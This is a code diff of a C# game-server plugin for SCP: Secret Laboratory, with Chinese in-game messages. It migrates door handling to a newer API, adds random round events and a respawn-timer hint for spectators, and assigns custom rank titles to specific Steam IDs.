 		private IEnumerator<float> SecondCounter24()
 		{
 			yield return Timing.WaitForSeconds(2f);
-			Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(scp035, 400)));
+			Timing.RunCoroutine(RunRestoreMaxHp(scp035, 400));
 			yield return Timing.WaitForSeconds(2f);
 		}
 
@@ -2048,12 +2017,12 @@ namespace YYYLike
 		}
 		private IEnumerator<float> SCP338awa(Player player)
 		{
-			while(true)
+			while (true)
 			{
 				yield return Timing.WaitForSeconds(150f);
 				int awa = new System.Random().Next(0, 35);
 				int aaa = new System.Random().Next(1, 3);
-				switch(aaa)
+				switch (aaa)
 				{
 					case 1:
 						player.AddItem((ItemType)awa);
@@ -2061,9 +2030,9 @@ namespace YYYLike
 						player.Broadcast(4, "<color=lime>-------[SCP338]-------</color>\n你已经获取随机物品");
 						break;
 					case 2:
-						foreach(Player player1 in Player.List)
+						foreach (Player player1 in Player.List)
 						{
-							if(player1.Role == RoleType.Scp049)
+							if (player1.Role == RoleType.Scp049)
 							{
 								scp49dis = Vector3.Distance(player1.Position, player.Position);
 							}
@@ -2089,13 +2058,13 @@ namespace YYYLike
 							}
 						}
 						player.ClearBroadcasts();
-						player.Broadcast(5,"当前距离SCP049:" + scp49dis + "173:" + scp173dis + "106:" + scp106dis + "96:" + scp96dis + "93953:" + scp93953dis + "93989" + scp93989dis);
+						player.Broadcast(5, "当前距离SCP049:" + scp49dis + "173:" + scp173dis + "106:" + scp106dis + "96:" + scp96dis + "93953:" + scp93953dis + "93989" + scp93989dis);
 						break;
 				}
 
 			}
 		}
-		
+
 		private IEnumerator<float> SecondCounter22()
 		{
 			while (scp457a)
@@ -2206,7 +2175,7 @@ namespace YYYLike
 			}
 			if (scp035item2)
 			{
-				Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(scp035, 500)));
+				Timing.RunCoroutine(RunRestoreMaxHp(scp035, 500));
 				scp035.AddItem(ItemType.GunUSP);
 				scp035.AddItem(ItemType.Ammo9mm);
 				scp035.AddItem(ItemType.Ammo9mm);
@@ -2215,13 +2184,20 @@ namespace YYYLike
 				Coroutines.Add(Timing.RunCoroutine(SCP550kx()));
 
 				scp035item2 = false;
-				foreach (Door door in Exiled.API.Features.Map.Doors)
+				foreach (DoorVariant door in Exiled.API.Features.Map.Doors)
 				{
-					if (door.DoorName == "173_ARMORY")
-					{
-						door.DestroyDoor(true);
-						scp035.ReferenceHub.playerMovementSync.OverridePosition(new Vector3(door.transform.position.x, door.transform.position.y + 1.5f, door.transform.position.z), 0, false);
+                    try
+                    {
+						if (door.GetComponent<DoorNametagExtension>().GetName == "173_ARMORY")
+						{
+							scp035.ReferenceHub.playerMovementSync.OverridePosition(new Vector3(door.transform.position.x, door.transform.position.y + 1.5f, door.transform.position.z), 0, false);
+						}
 					}
+                    catch
+                    {
+
+                    }
+
 				}
 			}
 			if (d9341flash)
@@ -2237,7 +2213,7 @@ namespace YYYLike
 			}
 			if (scp035health)
 			{
-				Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(scp035, 400)));
+				Timing.RunCoroutine(RunRestoreMaxHp(scp035, 400));
 				scp035health = false;
 			}
 			foreach (Exiled.API.Features.Player referenceHub in Exiled.API.Features.Player.List)
@@ -2354,6 +2330,9 @@ namespace YYYLike
 								case "76561199000974508@steam":
 									Setrank_new("巧克力", "yellow", player);
 									break;
+								case "76561199027691478@steam":
+									Setrank_new("屑白嫖", "yellow", player);
+									break;
 							}
 						}
 						times5 = 2;
@@ -2368,6 +2347,9 @@ namespace YYYLike
 									break;
 								case "76561199000974508@steam":
 									Setrank_new("巧克力", "orange", player2);
+									break;
+								case "76561199027691478@steam":
+									Setrank_new("屑白嫖", "orange", player2);
 									break;
 							}
 						}
@@ -2385,6 +2367,9 @@ namespace YYYLike
 								case "76561199000974508@steam":
 									Setrank_new("巧克力", "pink", player3);
 									break;
+								case "76561199027691478@steam":
+									Setrank_new("屑白嫖", "pink", player3);
+									break;
 							}
 						}
 						times5 = 4;
@@ -2401,6 +2386,9 @@ namespace YYYLike
 								case "76561199000974508@steam":
 									Setrank_new("巧克力", "red", player4);
 									break;
+								case "76561199027691478@steam":
+									Setrank_new("屑白嫖", "red", player4);
+									break;
 							}
 						}
 						times5 = 5;
@@ -2416,6 +2404,9 @@ namespace YYYLike
 									break;
 								case "76561199000974508@steam":
 									Setrank_new("巧克力", "light_green", player5);
+									break;
+								case "76561199027691478@steam":
+									Setrank_new("屑白嫖", "light_green", player5);
 									break;
 							}
 						}
@@ -2434,6 +2425,10 @@ namespace YYYLike
 									break;
 								case "76561199000974508@steam":
 									Setrank_new("巧克力", "cyan", player6);
+									chenghaoyes = true;
+									break;
+								case "76561199027691478@steam":
+									Setrank_new("屑白嫖", "cyan", player6);
 									chenghaoyes = true;
 									break;
 							}
@@ -2476,7 +2471,7 @@ namespace YYYLike
 								case "76561198997348090@steam":
 									Setrank_new("因为是魔王所以很棒呀", "lime", player);
 									break;
-								case "76561198893112896@steam":
+								case "76561198005990273@steam":
 									Setrank_new("迪奥·布兰度", "yellow", player);
 									break;
 								case "76561198377975833@steam":
@@ -2494,7 +2489,7 @@ namespace YYYLike
 								case "76561198978421435@steam":
 									Setrank_new("菜鸡", "yellow", player);
 									break;
-									
+
 							}
 						}
 						times5 = 2;
@@ -2519,7 +2514,7 @@ namespace YYYLike
 								case "76561198997348090@steam":
 									Setrank_new("因为是魔王所以很棒呀", "crimson", player2);
 									break;
-								case "76561198893112896@steam":
+								case "76561198005990273@steam":
 									Setrank_new("迪奥·布兰度", "orange", player2);
 									break;
 								case "76561198377975833@steam":
@@ -2561,7 +2556,7 @@ namespace YYYLike
 								case "76561198997348090@steam":
 									Setrank_new("因为是魔王所以很棒呀", "cyan", player3);
 									break;
-								case "76561198893112896@steam":
+								case "76561198005990273@steam":
 									Setrank_new("迪奥·布兰度", "pink", player3);
 									break;
 								case "76561198377975833@steam":
@@ -2603,7 +2598,7 @@ namespace YYYLike
 								case "76561198997348090@steam":
 									Setrank_new("因为是魔王所以很棒呀", "red", player4);
 									break;
-								case "76561198893112896@steam":
+								case "76561198005990273@steam":
 									Setrank_new("迪奥·布兰度", "red", player4);
 									break;
 								case "76561198377975833@steam":
@@ -2645,7 +2640,7 @@ namespace YYYLike
 								case "76561198997348090@steam":
 									Setrank_new("因为是魔王所以很棒呀", "light_green", player5);
 									break;
-								case "76561198893112896@steam":
+								case "76561198005990273@steam":
 									Setrank_new("迪奥·布兰度", "light_green", player5);
 									break;
 								case "76561198377975833@steam":
@@ -2693,7 +2688,7 @@ namespace YYYLike
 									chenghaoyes = true;
 									Setrank_new("因为是魔王所以很棒呀", "yellow", player6);
 									break;
-								case "76561198893112896@steam":
+								case "76561198005990273@steam":
 									chenghaoyes = true;
 									Setrank_new("迪奥·布兰度", "cyan", player6);
 									break;
@@ -2770,7 +2765,11 @@ namespace YYYLike
 				}
 				if (!ljfuse && !jzsjuse && !qblcq2 && !sjtz1)
 				{
-					Timing.KillCoroutines(Coroutines3);
+					foreach (CoroutineHandle coroutineHandle in Coroutines3)
+					{
+
+						Timing.KillCoroutines(coroutineHandle);
+					}
 					Coroutines3.Clear();
 				}
 				yield return Timing.WaitForSeconds(0.1f);
@@ -2851,7 +2850,6 @@ namespace YYYLike
 		public void OnDecontaminate(DecontaminatingEventArgs ev)
 		{
 			Exiled.API.Features.Map.Broadcast(5, "<color=red>[警告]</color>\n地下毒气已开启");
-			Coroutines.Add(Timing.RunCoroutine(Whereareyou2()));
 			dq = true;
 		}
 
@@ -2963,7 +2961,7 @@ namespace YYYLike
 		private IEnumerator<float> Scp550item()
 		{
 			yield return Timing.WaitForSeconds(2f);
-			Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(scp550, 4000)));
+			Timing.RunCoroutine(RunRestoreMaxHp(scp550, 4000));
 			Setrank_new("SCP-550", "red", scp550);
 			meitunshi = true;
 			scp550.Broadcast(10, "<color=lime>[SCP550]</color>\n<color=yello>你是食尸鬼:HP:5000 如果30s内没吞噬尸体每秒损失8HP</color>\n<color=yellow>站在尸体边上即可吞噬尸体 吞噬完成后你会获得能力的提升</color>");
@@ -2979,7 +2977,7 @@ namespace YYYLike
 			HDZHG.ClearBroadcasts();
 			HDZHG.Broadcast(5, "<color=yellow>[个人通知]</color>\n<color=lime>你是</color><color=#00FFFF>[混沌指挥官]</color><color=lime>请带领着混沌走向胜利\n输入.help查看技能</color>");
 			Setrank_new("混沌指挥官", "yello", HDZHG);
-			Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(HDZHG, 150)));
+			Timing.RunCoroutine(RunRestoreMaxHp(HDZHG, 150));
 			HDZHG.AddItem(ItemType.KeycardO5);
 			Timing.RunCoroutine(testHint("hdzhg", HDZHG));
 			HDZHG2.Add(HDZHG.UserId);
@@ -2988,7 +2986,7 @@ namespace YYYLike
 		private IEnumerator<float> Mzzb()
 		{
 			yield return Timing.WaitForSeconds(2f);
-			Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(mz, 500)));
+			Timing.RunCoroutine(RunRestoreMaxHp(mz, 500));
 			mz.AddItem(ItemType.SCP500);
 			mz.AddItem(ItemType.Adrenaline);
 			Setrank_new("毛子", "white", mz);
@@ -3059,7 +3057,7 @@ namespace YYYLike
 			jwhng.AddItem(ItemType.Radio);
 			jwhng.AddItem(ItemType.GrenadeFlash);
 			jwhng.AddItem(ItemType.Adrenaline);
-			Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(jwhng, 350)));
+			Timing.RunCoroutine(RunRestoreMaxHp(jwhng, 350));
 			Timing.RunCoroutine(testHint("jwhng", jwhng));
 		}
 
@@ -3178,7 +3176,7 @@ namespace YYYLike
 			{
 				foreach (Exiled.API.Features.Player p in Exiled.API.Features.Player.List)
 				{
-					if (p.Health <= 1f && p.Id != scp650id)
+					if (p.Health == 1f && p.Id != scp650id)
 					{
 						Exiled.API.Features.Map.Broadcast(1, p.Nickname + "：你不要过来呀");
 						p.AddItem(ItemType.SCP207);
@@ -3266,53 +3264,6 @@ namespace YYYLike
 			hrss = false;
 		}
 
-		private IEnumerator<float> SecondCounter()
-		{
-			while (true)
-			{
-				try
-				{
-					Dio.IsGodModeEnabled = false;
-					scp457.IsGodModeEnabled = false;
-				}
-				catch
-				{
-				}
-				if (csm)
-				{
-					csmtime++;
-					if (csmtime == 1)
-					{
-						csm = false;
-						csmtime = 0;
-					}
-				}
-				if (starttimer)
-				{
-					deadtimer = deadtimer++;
-					waring1 = waring1++;
-					if (coldbc)
-					{
-						coldtime++;
-						if (coldtime == 8)
-						{
-							coldbc = false;
-							coldtime = 0;
-						}
-					}
-					if (coldtb)
-					{
-						coldtime2++;
-						if (coldtime2 == 30)
-						{
-							coldtb = false;
-							coldtime = 0;
-						}
-					}
-				}
-				yield return Timing.WaitForSeconds(10f);
-			}
-		}
 
 		public void ScpSpawn()
 		{
@@ -3325,7 +3276,7 @@ namespace YYYLike
 				scp.AddItem(ItemType.Radio);
 				scp.AddItem(ItemType.GunMP7);
 				Setrank_new("SCP-999", "pink", scp);
-				Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(scp, 4000)));
+				Timing.RunCoroutine(RunRestoreMaxHp(scp, 4000));
 				scp.ClearBroadcasts();
 				scp.Broadcast(10, "[<color=red>SCP-999</color>]\n<color=yellow>去给人们带去欢乐吧</color>");
 				scp.Ammo[(int)AmmoType.Nato556] = 400;
@@ -3360,15 +3311,15 @@ namespace YYYLike
 			yield return Timing.WaitForSeconds(3f);
 			player.Kick("你被管理员封了，具体解封时间:" + rea);
 		}
-		
+
 		private IEnumerator<float> BackSpeed()
-        {
+		{
 			yield return Timing.WaitForSeconds(10f);
 
 			ServerConfigSynchronizer.Singleton.NetworkHumanWalkSpeedMultiplier = 1f;
 		}
 		private IEnumerator<float> BackMana()
-        {
+		{
 			yield return Timing.WaitForSeconds(60f);
 			foreach (Player player in Player.List)
 			{
@@ -3401,6 +3352,8 @@ namespace YYYLike
 							scp650.ReferenceHub.playerMovementSync.OverridePosition(player.Position, 0, false);
 						}
 					}
+					yield return Timing.WaitForSeconds(0.1f);
+
 				}
 			}
 			stealcd = false;
@@ -3418,8 +3371,8 @@ namespace YYYLike
 				{
 					//SCP加血
 					referenceHub.Health += 75f;
-					if(Player.List.Count() >= 36)
-                    {
+					if (Player.List.Count() >= 36)
+					{
 						referenceHub.Health += 50f;
 					}
 				}
@@ -3442,7 +3395,7 @@ namespace YYYLike
 								Setrank_new("奇迹的幻想之人", "red", fkyyz);
 								fkyyz.Role = RoleType.Tutorial;
 								fkyyzid = fkyyz.Id;
-								Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(fkyyz, 500)));
+								Timing.RunCoroutine(RunRestoreMaxHp(fkyyz, 500));
 								Coroutines.Add(Timing.RunCoroutine(Fkyyztp()));
 								fkyyz.Broadcast(10, "<color=yellow>该人物正在测试 如果碰到</color><color=red>无敌 无限技能\n 或其他情况</color><color=yellow>请自觉退出服务器 理解万岁</color> \n<color=yellow>按~输入.help看使用方法</color>");
 								break;
@@ -3454,8 +3407,9 @@ namespace YYYLike
 				{
 					Log.Info("符卡错误");
 				}
-
 			}
+			yield return Timing.WaitForSeconds(0.1f);
+
 			if (fkyyzyes)
 			{
 				fkyyzcardint++;
@@ -3477,6 +3431,7 @@ namespace YYYLike
 
 			}
 			kccd = false;
+			yield return Timing.WaitForSeconds(0.1f);
 			if (!scp457die && !scp457a)
 			{
 				foreach (Exiled.API.Features.Player player5 in Exiled.API.Features.Player.List)
@@ -3494,7 +3449,7 @@ namespace YYYLike
 								Setrank_new("SCP-457", "red", scp457);
 								scp457.SetRole(RoleType.Tutorial);
 								Coroutines.Add(Timing.RunCoroutine(Scp457tp()));
-								Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(scp457, 4000)));
+								Timing.RunCoroutine(RunRestoreMaxHp(scp457, 4000));
 								Exiled.API.Features.Map.Broadcast(10, "<color=red>[SCP457]</color>\n<color=lime>突破收容 请尽快将其重新收容</color>");
 								scp457.Broadcast(10, "<color=#FFC0CB>---[SCP457]---</color>\n<color=#00FFFF>HP:4000  </color>你拥有一种特殊能力\n<color=#FFD700>在你周围的人都会扣血 持有SCP物品越多伤害越高</color>");
 								break;
@@ -3509,12 +3464,64 @@ namespace YYYLike
 					}
 				}
 			}
+			yield return Timing.WaitForSeconds(0.1f);
 			sjtz2 = false;
 			coldwait233 = false;
-			int sjsj2 = new System.Random().Next(1, 61);
+			int sjsj2 = new System.Random().Next(1, 63);
 
 			switch (sjsj2)
 			{
+				case 63:
+					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>容嬷嬷转世:随机一个DD获得肾上腺素*6</color>");
+
+					foreach (Player p in Player.List)
+					{
+						if(p.Role == RoleType.ClassD)
+                        {
+							p.AddItem(ItemType.Adrenaline);
+							p.AddItem(ItemType.Adrenaline);
+							p.AddItem(ItemType.Adrenaline);
+							p.AddItem(ItemType.Adrenaline);
+							p.AddItem(ItemType.Adrenaline);
+							p.AddItem(ItemType.Adrenaline);
+							p.SendConsoleMessage("来自2873598061事件", "yellow");
+							break;
+						}
+						
+
+					}
+					break;
+				case 62:
+					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>傻瓜蛋！-事件：傻瓜蛋 要炸了</color>");
+					yield return Timing.WaitForSeconds(5f);
+					Map.ClearBroadcasts();
+					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>5s</color>");
+					yield return Timing.WaitForSeconds(1f);
+					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>4s</color>");
+					yield return Timing.WaitForSeconds(1f);
+					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>3s</color>");
+					yield return Timing.WaitForSeconds(1f);
+					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>2s</color>");
+					yield return Timing.WaitForSeconds(1f);
+					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>1s</color>");
+					yield return Timing.WaitForSeconds(1f);
+
+					foreach (Player p in Player.List)
+					{
+						p.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Flashed>(15, true);
+						p.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Blinded>(30, true);
+					}
+					break;
+				case 61:
+					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>肾虚往往是在国度劳累之后！-事件：服务器全员 肾虚</color>");
+					foreach (Player p in Player.List)
+					{
+						if (p.Team != Team.SCP)
+						{
+							p.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Exhausted>(30, true);
+						}
+					}
+					break;
 				case 60:
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>快生活！-事件：服务器全员 移速变快</color>");
 					ServerConfigSynchronizer.Singleton.NetworkHumanWalkSpeedMultiplier = 2f;
@@ -3524,12 +3531,12 @@ namespace YYYLike
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>我练功发自真心！-事件：SCP-079停电1分钟</color>");
 
 					foreach (Player player in Player.List)
-                    {
-						if(player.Role == RoleType.Scp079)
-                        {
+					{
+						if (player.Role == RoleType.Scp079)
+						{
 							player.ReferenceHub.scp079PlayerScript.maxMana = 1;
-                        }
-                    }
+						}
+					}
 					Timing.RunCoroutine(BackMana());
 					break;
 				case 58:
@@ -3546,9 +3553,9 @@ namespace YYYLike
 					break;
 				case 57:
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>只有新兵可以吗！-事件：所有九尾狐变成新兵</color>");
-					foreach(Player player in Player.List)
+					foreach (Player player in Player.List)
 					{
-						if(player.Role == RoleType.NtfCommander || player.Role == RoleType.NtfLieutenant || player.Role == RoleType.NtfScientist)
+						if (player.Role == RoleType.NtfCommander || player.Role == RoleType.NtfLieutenant || player.Role == RoleType.NtfScientist)
 						{
 							player.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.NtfCadet, true);
 						}
@@ -3557,12 +3564,12 @@ namespace YYYLike
 
 				case 56:
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>撸多了！-事件：随机一个人眼花</color>");
-					foreach(Player player in Player.List)
+					foreach (Player player in Player.List)
 					{
-						if(player.Team != Team.SCP &&player.Role != RoleType.Spectator)
+						if (player.Team != Team.SCP && player.Role != RoleType.Spectator)
 						{
-							
-							player.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Blinded>(30,true);
+
+							player.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Blinded>(30, true);
 							break;
 						}
 					}
@@ -3571,25 +3578,30 @@ namespace YYYLike
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>FBI OPEN The Door！-事件：3个九尾狐传送到914</color>");
 					if (!dq)
 					{
-						foreach (Door door in Map.Doors)
+						foreach (DoorVariant door in Map.Doors)
 						{
-							if (door.DoorName.Contains("914"))
+							if (door.GetComponent<DoorNametagExtension>().GetName == "173_ARMORY")
 							{
-								door.isOpen = true;
-								int awa = 1;
-								foreach (Player player in Player.List)
+								if (door.GetComponent<DoorNametagExtension>().GetName.Contains("914"))
 								{
-									awa++;
-									if (player.Team == Team.MTF)
+									DoorEvents.TriggerAction(door, DoorAction.Opened, null);
+									int awa = 1;
+									foreach (Player player in Player.List)
 									{
-										player.Position = door.localPos;
-									}
-									if (awa == 4)
-									{
-										break;
+										awa++;
+										if (player.Team == Team.MTF)
+										{
+											player.Position = door.transform.position;
+										}
+										if (awa == 4)
+										{
+											break;
+										}
 									}
 								}
 							}
+							
+
 						}
 					}
 
@@ -3598,7 +3610,7 @@ namespace YYYLike
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>食堂开饭！-事件：SCP914刷5张清洁工卡</color>");
 					foreach (Room room in Map.Rooms)
 					{
-						if(room.Name.Contains("LCZ_914"))
+						if (room.Name.Contains("LCZ_914"))
 						{
 							PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.KeycardJanitor, 520f, room.Position, Quaternion.identity, 0, 0, 0);
 							PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.KeycardJanitor, 520f, room.Position, Quaternion.identity, 0, 0, 0);
@@ -3611,11 +3623,11 @@ namespace YYYLike
 					break;
 				case 52:
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>……我不做人了，狐步舞！-事件：DD原地变成训练人员</color>");
-					foreach(Player player in Player.List)
+					foreach (Player player in Player.List)
 					{
-						if(player.Role == RoleType.ClassD)
+						if (player.Role == RoleType.ClassD)
 						{
-							player.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.Tutorial, true) ;
+							player.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.Tutorial, true);
 							break;
 						}
 					}
@@ -3821,9 +3833,9 @@ namespace YYYLike
 				case 18:
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>恩断义绝门！-事件：10s后全部门关闭</color>");
 					yield return Timing.WaitForSeconds(10f);
-					foreach (Door door2 in Exiled.API.Features.Map.Doors)
+					foreach (DoorVariant door2 in Exiled.API.Features.Map.Doors)
 					{
-						door2.isOpen = false;
+						//			door2. = false;
 					}
 					break;
 				case 19:
@@ -4003,24 +4015,25 @@ namespace YYYLike
 					break;
 				case 38:
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>畅通无阻！-事件：服务器全部门开启</color>");
-					foreach (Door door3 in Exiled.API.Features.Map.Doors)
+					foreach (DoorVariant door3 in Exiled.API.Features.Map.Doors)
 					{
-						door3.isOpen = true;
+						DoorEvents.TriggerAction(door3, DoorAction.Opened, null);
+
 					}
 					break;
 				case 39:
 					Exiled.API.Features.Map.Broadcast(10, "<color=#BB1444>寸步难行！-事件：服务器全部门关闭并锁住10s</color>");
 					Log.Info("随机事件测试");
-					foreach (Door door in Exiled.API.Features.Map.Doors)
+					foreach (DoorVariant door in Exiled.API.Features.Map.Doors)
 					{
-						door.isOpen = false;
-						door.locked = true;
+						DoorEvents.TriggerAction(door, DoorAction.Closed, null);
+						door.ServerChangeLock(DoorLockReason.None, true);
 					}
 					yield return Timing.WaitForSeconds(10f);
 
-					foreach (Door door4 in Exiled.API.Features.Map.Doors)
+					foreach (DoorVariant door4 in Exiled.API.Features.Map.Doors)
 					{
-						door4.locked = false;
+						door4.ServerChangeLock(DoorLockReason.None, false);
 					}
 					break;
 				case 40:
@@ -4091,7 +4104,6 @@ namespace YYYLike
 							break;
 						}
 					}
-					Coroutines.Add(Timing.RunCoroutine(Slowly()));
 					break;
 				case 50:
 					Map.Broadcast(10, "<color=#BB1444>眼镜睁大了！-事件：50s内不会眨眼</color>");
@@ -4104,7 +4116,7 @@ namespace YYYLike
 					break;
 				case 53:
 					Map.Broadcast(10, "<color=#BB1444>卡其脱离太！-事件：随机一个人获得4瓶可乐</color>");
-					foreach(Player player in Player.List)
+					foreach (Player player in Player.List)
 					{
 						if (player.Team != Team.SCP)
 						{
@@ -4119,6 +4131,8 @@ namespace YYYLike
 				default:
 					break;
 			}
+			yield return Timing.WaitForSeconds(0.2f);
+
 			if (!Dio1)
 			{
 				try
@@ -4152,7 +4166,7 @@ namespace YYYLike
 							{
 								Dio.SetRole(RoleType.Tutorial);
 								Dio.Position = RoleType.ChaosInsurgency.GetRandomSpawnPoint();
-								Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(Dio, 500)));
+								Timing.RunCoroutine(RunRestoreMaxHp(Dio, 500));
 								Dio.AddItem(ItemType.Flashlight);
 								Dio.AddItem(ItemType.GunE11SR);
 								Dio.AddItem(ItemType.MicroHID);
@@ -4179,82 +4193,25 @@ namespace YYYLike
 			}
 
 		}
-		public void Timing22()
+		private IEnumerator<float> Respawntime()
 		{
-			while (true)
-			{
-				Thread.Sleep(5000);
-				foreach(int i in scp881xiaoid)
+			while(roundstart)
+            {
+				yield return Timing.WaitForSeconds(1f);
+				string temp = "\n\n\n\n\n\n\n<align=left>" + "<pos=-27%>你以阵亡" + "\n<pos=-27%>但是不用担心你马上会复活:" +"\n<pos=-27%>剩余时间:" + Respawn.TimeUntilRespawn.ToString() + "\n<pos=-27%>九尾狐机票数" + Respawn.NtfTickets.ToString()+ "\n<pos=-27%>混沌机票数"+ Respawn.ChaosTickets.ToString() +"\n<pos=-27%>\n\n\n\n\n\n";
+
+				foreach (Player player in Player.List)
 				{
-					GameObject target =  Player.Get(i).GameObject;
-					float x = 0.5f;
-					float y = 0.5f;
-					float z = 0.5f;
-
-					try
-					{
-						NetworkIdentity identity = target.GetComponent<NetworkIdentity>();
-						target.transform.localScale = new Vector3(1 * x, 1 * y, 1 * z);
-
-						ObjectDestroyMessage destroyMessage = new ObjectDestroyMessage();
-						destroyMessage.netId = identity.netId;
-
-						foreach (GameObject player in PlayerManager.players)
-						{
-							NetworkConnection playerCon = player.GetComponent<NetworkIdentity>().connectionToClient;
-							if (player != target)
-								playerCon.Send(destroyMessage, 0);
-
-							object[] parameters = new object[] { identity, playerCon };
-							typeof(NetworkServer).InvokeStaticMethod("SendSpawnMessage", parameters);
-						}
-					}
-					catch (Exception e)
-					{
-						Log.Info($"设置失败: {e}");
+					if(player.Role == RoleType.Spectator)
+                    {
+						player.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1] { new StringHintParameter("") }));
 					}
 				}
-				foreach (int i in scp881daid)
-				{
-					GameObject target = Player.Get(i).GameObject;
-					float x = 1f;
-					float y = 1f;
-					float z = 1f;
-
-					try
-					{
-						NetworkIdentity identity = target.GetComponent<NetworkIdentity>();
-						target.transform.localScale = new Vector3(1 * x, 1 * y, 1 * z);
-
-						ObjectDestroyMessage destroyMessage = new ObjectDestroyMessage();
-						destroyMessage.netId = identity.netId;
-
-						foreach (GameObject player in PlayerManager.players)
-						{
-							NetworkConnection playerCon = player.GetComponent<NetworkIdentity>().connectionToClient;
-							if (player != target)
-								playerCon.Send(destroyMessage, 0);
-
-							object[] parameters = new object[] { identity, playerCon };
-							typeof(NetworkServer).InvokeStaticMethod("SendSpawnMessage", parameters);
-						}
-					}
-					catch (Exception e)
-					{
-						Log.Info($"设置失败: {e}");
-					}
-				}
-				scp881xiaoid.Clear();
-				scp881daid.Clear();
-
 			}
-		}
+		} 
 		public void OnRoundStart()
 		{
 			Map.ClearBroadcasts();
-			Timing223 = new Thread(Timing22);
-			Timing223.Start();
-
 			player_list = new List<Exiled.API.Features.Player>();
 			foreach (Exiled.API.Features.Player p in Exiled.API.Features.Player.List)
 			{
@@ -4263,6 +4220,8 @@ namespace YYYLike
 					player_list.Add(p);
 				}
 			}
+			Coroutines.Add(Timing.RunCoroutine(Respawntime()));
+
 			Coroutines.Add(Timing.RunCoroutine(SecondCounter5()));
 			Coroutines.Add(Timing.RunCoroutine(SecondCounter18()));
 			Coroutines.Add(Timing.RunCoroutine(SecondCounter21()));
@@ -4321,13 +4280,12 @@ namespace YYYLike
 			{
 				Exiled.API.Features.Map.Broadcast(2, "<color=lime>↓↓↓↓本回合幸运玩家↓↓↓↓</color>\n<color=green>" + "无" + "</color>\n<color=red>你们好非哦</color>");
 			}
-			foreach(Door door1 in Map.Doors)
+			foreach(DoorVariant door1 in Map.Doors)
 			{
-				if(door1.DoorName.Contains("079_SECOND"))
+				if(door1.name.Contains("079_SECOND"))
 				{
-					door1.isOpen = true;
-					Pickup pickup2 = PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.Radio, 9999f,new Vector3(door1.localPos.x,door1.localPos.y+1,door1.localPos.z) , Quaternion.identity, 0, 0, 0);
-					scp338 = pickup2;
+					DoorEvents.TriggerAction(door1, DoorAction.Opened, null);
+					scp338 = PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.Radio, 9999f,new Vector3(door1.transform.position.x,door1.transform.position.y+1,door1.transform.position.z) , Quaternion.identity, 0, 0, 0);
 				}
 			}
 
@@ -4380,242 +4338,304 @@ namespace YYYLike
 		}
 		public void End()
 		{
-			crowbarid = 0;
-			crowbaryes = false;
-			scp881id.Clear();
+			foreach (CoroutineHandle coroutineHandle in Coroutines4)
+			{
+				Timing.KillCoroutines(coroutineHandle);
+			}
+			foreach (CoroutineHandle coroutineHandle in Coroutines)
+			{
+				Timing.KillCoroutines(coroutineHandle);
+			}
+			Coroutines.Clear();
+			foreach (CoroutineHandle coroutineHandle in Coroutines2)
+			{
+				Timing.KillCoroutines(coroutineHandle);
+			}
+			Coroutines2.Clear();
+			foreach (CoroutineHandle coroutineHandle in Coroutines3)
+			{
+				Timing.KillCoroutines(coroutineHandle);
+			}
+			url = "http://127.0.0.1:4578/";
+			h = false;
+			choise = false;
+			scp = null;
+			die = false;
+			start = false;
+			int222 = 0;
+			scp_999 = new List<string>();
 			黑暗掌控者 = null;
 			黑暗掌控者id = 0;
 			黑暗掌控者yes = false;
-			Timing.KillCoroutines(Coroutines4);
-			Coroutines4.Clear();
-			scp738id = 0;
-			scp738 = null;
-			scp738item.Clear();
-			scp1499 = null;
-			scp1499jh = false;
-			scp1499pickupid = 0;
-			scp1499pos = new Vector3();
-			gongpingliaotian.Clear();
-			shutdowncde = false;
-			shutdownyes = false;
-			cjxb = null;
-			cjxbid = 0;
-			bssy = null;
-			bssyid = 0;
-			busishenyaoyes = false;
-			gdyes = false;
-			第一次.Clear();
-			第二次.Clear();
-			Baba.Clear();
-			Baba1.Clear();
-			scp106donotliked = false;
-			qingjiegongnum = 0;
-			pmdon = false;
-
-			scp650noxiaren = false;
-			scp3108playerid = 0;
-			sjtz1 = false;
-			sjtz2 = false;
-			sbxd.Clear();
-			dfzgc = false;
-			timesbxd = 0;
-			lbvyes = false;
-			lbv = null;
-			lbvid = 0;
-			dq = false;
-			g = 0;
-			hdjjs = null;
-			hdjjsid = 0;
